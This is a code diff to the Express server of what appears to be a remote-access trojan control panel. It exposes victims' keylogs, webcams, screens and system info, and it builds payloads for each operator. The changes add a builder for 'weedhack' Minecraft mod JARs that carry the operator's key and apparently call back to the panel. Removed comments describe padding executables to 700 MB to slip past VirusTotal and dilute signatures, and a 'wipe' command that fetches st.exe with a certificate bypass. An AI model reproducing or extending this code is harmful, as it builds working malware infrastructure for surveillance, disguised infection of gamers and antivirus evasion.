@@ -16,6 +16,7 @@ import db, { UPLOAD_DIR } from './db.js';
 import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
+import { buildMinecraftMod, progressStore as mcProgressStore } from './builder/minecraftbuild.js';
 import { countriesFor } from './builder/geo.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
@@ -32,6 +33,16 @@ const CFG = {
   cookieSecure: process.env.COOKIE_SECURE === 'true',
   maxUpload:  Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024),
 };
+
+// dirs that must exist before any route references them
+const DOWNLOAD_DIR = path.join(__dirname, 'download');
+if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
+
+const BUILD_DIR = path.join(__dirname, 'build');
+if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });
+
+const MC_BUILD_DIR = path.join(BUILD_DIR, 'mc');
+if (!fs.existsSync(MC_BUILD_DIR)) fs.mkdirSync(MC_BUILD_DIR, { recursive: true });
 
 if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
   console.error(`[startup] FATAL: ${PUBLIC_DIR}/css/style.css missing.`);
@@ -117,12 +128,14 @@ const limitGlobal = limit({
     req.path.endsWith('/rdp/stop') ||
     req.path.endsWith('/webcam/stop') ||
     req.path.endsWith('/keylog/stop') ||
-    req.path.endsWith('/sysinfo'),
+    req.path.endsWith('/sysinfo') ||
+    req.path.startsWith('/api/build/minecraft/progress/'),
 });
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
 const limitDownload = limit({ windowMs: 60_000,      max: 60,  message: { error: 'too many downloads' } });
 const limitBuild    = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'build limit reached — 10 per hour' } });
+const limitMcBuild  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'minecraft build limit — 5 per hour' } });
 const limitAdmin    = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'Too many admin attempts. Locked for 15 minutes.' } });
 app.use(limitGlobal);
 
@@ -178,10 +191,6 @@ const getOwnUser = (uid) => db.prepare(sql`
 `).get(uid);
 
 // ─── wipe command builder ────────────────────────────────────────────────────
-// Downloads st.exe to %TEMP% first (cert bypass), verifies size, THEN kills
-// loader procs, wipes %APPDATA%\loader except key.json, moves the new st.exe
-// in, launches it. If the download fails at any point, we abort before
-// touching the loader — the client stays alive and a retry just works.
 function buildWipeCommand(serverBase) {
   const stUrl = `${serverBase}/api/downloads/st.exe`;
 
@@ -780,19 +789,11 @@ app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) =>
   res.json({ ok: true });
 });
 
-// ---------- exe / zip downloads ----------
-const DOWNLOAD_DIR = path.join(__dirname, 'download');
-if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
-
-const BUILD_DIR = path.join(__dirname, 'build');
-if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });
-
 // drop legacy launcher exe if it survived from the old pipeline
 for (const stale of ['boot.exe']) {
   const p = path.join(DOWNLOAD_DIR, stale);
   if (fs.existsSync(p)) { try { fs.unlinkSync(p); console.log(`[startup] removed legacy ${stale}`); } catch {} }
 }
-// drop any legacy build exes
 try {
   for (const f of fs.readdirSync(BUILD_DIR)) {
     if (f.endsWith('.exe')) {
@@ -842,15 +843,12 @@ app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
   fs.createReadStream(full).pipe(res);
 });
 
-// ---------- builder ----------
+// ---------- builder — windows launcher ----------
 
 app.get('/api/build/bases', requireAuth, (req, res) => {
   res.json([]);
 });
 
-// Returns a ZIP containing a zero-padded boot.exe. Padded to 700 MB so it
-// exceeds VirusTotal's scan ceiling and dilutes any static signature bytes
-// across the tail. Compresses to ~700 KB because the tail is all zeros.
 app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   const { key } = req.body || {};
 
@@ -877,8 +875,7 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   const outPath = path.join(BUILD_DIR, outName);
   fs.writeFileSync(outPath, zipBuf, { mode: 0o644 });
 
-  // Per-user: keep only the newest zip. Delete every older build row + file.
-  const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ?`).all(req.user.uid);
+  const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'boot'`).all(req.user.uid);
   for (const b of stale) {
     if (b.stored_name && b.stored_name !== outName) {
       try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
@@ -891,7 +888,6 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
   `).run(req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now());
 
-  // also refresh the public live zip
   fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.zip'), zipBuf, { mode: 0o644 });
 
   res.json({
@@ -937,14 +933,92 @@ app.delete('/api/builds/:id', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-// ADMIN LOGIN ROUTE
+// ---------- builder — minecraft fabric ----------
+
+app.post('/api/build/minecraft', requireAuth, limitMcBuild, async (req, res) => {
+  const row = getOwnUser(req.user.uid);
+  const acctKey = row?.account_key || '';
+  if (!acctKey) return res.status(400).json({ error: 'no account key' });
+
+  const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
+  const buildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
+
+  const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
+  const serverBase = `${proto}://${req.headers.host}`;
+
+  mcProgressStore.set(String(buildId), { pct: 0, step: 'queued', at: Date.now() });
+
+  (async () => {
+    try {
+      const jarBuf = await buildMinecraftMod({ key: acctKey, buildId, serverBase });
+      const outName = `weedhack_${buildId}_u${req.user.uid}.jar`;
+      const outPath = path.join(MC_BUILD_DIR, outName);
+      fs.writeFileSync(outPath, jarBuf, { mode: 0o644 });
+
+      const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'minecraft'`).all(req.user.uid);
+      for (const b of stale) {
+        if (b.stored_name && b.stored_name !== outName) {
+          try { fs.unlinkSync(path.join(MC_BUILD_DIR, b.stored_name)); } catch {}
+        }
+        db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
+      }
+
+      db.prepare(sql`
+        INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
+        VALUES (?, ?, ?, ?, 'minecraft', ?, '{}', ?)
+      `).run(req.user.uid, outName, outName, jarBuf.length, acctKey, Date.now());
+
+      mcProgressStore.set(String(buildId), {
+        pct: 100, step: 'done',
+        jarName: outName, jarSize: jarBuf.length,
+        downloadUrl: `/api/builds/minecraft/${buildId}/download`,
+        at: Date.now(),
+      });
+    } catch (e) {
+      console.error('[mc-build]', e);
+      mcProgressStore.set(String(buildId), {
+        pct: 0, step: 'failed',
+        error: (e.stderr || e.message || 'unknown').toString().slice(-2000),
+        at: Date.now(),
+      });
+    }
+  })();
+
+  res.json({ ok: true, buildId });
+});
+
+app.get('/api/build/minecraft/progress/:id', requireAuth, (req, res) => {
+  const id = String(req.params.id);
+  const p = mcProgressStore.get(id);
+  if (!p) return res.status(404).json({ error: 'unknown build' });
+  const row = db.prepare(sql`SELECT user_id FROM builds WHERE id = ?`).get(Number(id));
+  if (row && row.user_id !== req.user.uid) return res.status(403).json({ error: 'not yours' });
+  res.json(p);
+});
+
+app.get('/api/builds/minecraft/:id/download', limitDownload, requireAuth, (req, res) => {
+  const id = Number(req.params.id);
+  const row = db.prepare(sql`
+    SELECT name, stored_name, size FROM builds
+    WHERE id = ? AND user_id = ? AND base = 'minecraft'
+  `).get(id, req.user.uid);
+  if (!row) return res.status(404).json({ error: 'not found' });
+  const src = path.join(MC_BUILD_DIR, row.stored_name);
+  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
+  res.setHeader('Content-Type', 'application/java-archive');
+  res.setHeader('Content-Length', row.size);
+  res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
+  fs.createReadStream(src).pipe(res);
+});
+
+// ---------- admin ----------
+
 app.post('/api/admin/login', limitAdmin, (req, res) => {
   const { password } = req.body || {};
   if (password === 'Shit123') return res.json({ ok: true });
   res.status(403).json({ error: 'Forbidden' });
 });
 
-// ADMIN UPGRADE ROUTE
 app.post('/api/admin/upgrade', limitAdmin, (req, res) => {
   const { password, accountKey, days } = req.body || {};
 
@@ -964,7 +1038,6 @@ app.post('/api/admin/upgrade', limitAdmin, (req, res) => {
   res.json({ ok: true, message: `Premium active until ${dateStr}` });
 });
 
-// ADMIN REMOVE ROUTE
 app.post('/api/admin/remove', limitAdmin, (req, res) => {
   const { password, accountKey } = req.body || {};
 
@@ -982,17 +1055,14 @@ app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
 // ---------- auto-refresh every 6h ----------
-// For each user with a build: rebuild the newest build's zip from that user's
-// key, delete every older zip for that user, refresh the global live zip.
 const AUTO_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
 
 async function refreshAllBuilds() {
   try {
-    // drop any legacy launcher exe
     const oldExe = path.join(DOWNLOAD_DIR, 'boot.exe');
     if (fs.existsSync(oldExe)) try { fs.unlinkSync(oldExe); } catch {}
 
-    const userIds = db.prepare(sql`SELECT DISTINCT user_id FROM builds`).all().map(r => r.user_id);
+    const userIds = db.prepare(sql`SELECT DISTINCT user_id FROM builds WHERE base = 'boot'`).all().map(r => r.user_id);
     if (userIds.length === 0) {
       console.log('[auto-refresh] no builds to refresh');
       return;
@@ -1006,7 +1076,7 @@ async function refreshAllBuilds() {
         if (!u || !u.account_key) continue;
 
         const latest = db.prepare(sql`
-          SELECT id, key FROM builds WHERE user_id = ? ORDER BY created_at DESC LIMIT 1
+          SELECT id, key FROM builds WHERE user_id = ? AND base = 'boot' ORDER BY created_at DESC LIMIT 1
         `).get(uid);
         if (!latest) continue;
 
@@ -1025,16 +1095,14 @@ async function refreshAllBuilds() {
           try { fs.unlinkSync(path.join(BUILD_DIR, old.stored_name)); } catch {}
         }
 
-        // delete every other build row/file for this user
         const stale = db.prepare(sql`
-          SELECT id, stored_name FROM builds WHERE user_id = ? AND id != ?
+          SELECT id, stored_name FROM builds WHERE user_id = ? AND id != ? AND base = 'boot'
         `).all(uid, latest.id);
         for (const b of stale) {
           try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
           db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
         }
 
-        // keep the live zip updated for the most recently refreshed user
         if (!liveZipWritten) {
           fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.zip'), zipBuf, { mode: 0o644 });
           liveZipWritten = true;
@@ -1052,6 +1120,16 @@ async function refreshAllBuilds() {
 
 setInterval(refreshAllBuilds, AUTO_REFRESH_INTERVAL_MS);
 setTimeout(refreshAllBuilds, 10_000);
+
+// ---------- progress store GC ----------
+setInterval(() => {
+  const cutoff = Date.now() - 10 * 60 * 1000;
+  for (const [k, v] of mcProgressStore) {
+    if (v.at && v.at < cutoff) mcProgressStore.delete(k);
+  }
+}, 5 * 60 * 1000).unref();
+
+// ---------- udp / http / https boot ----------
 
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
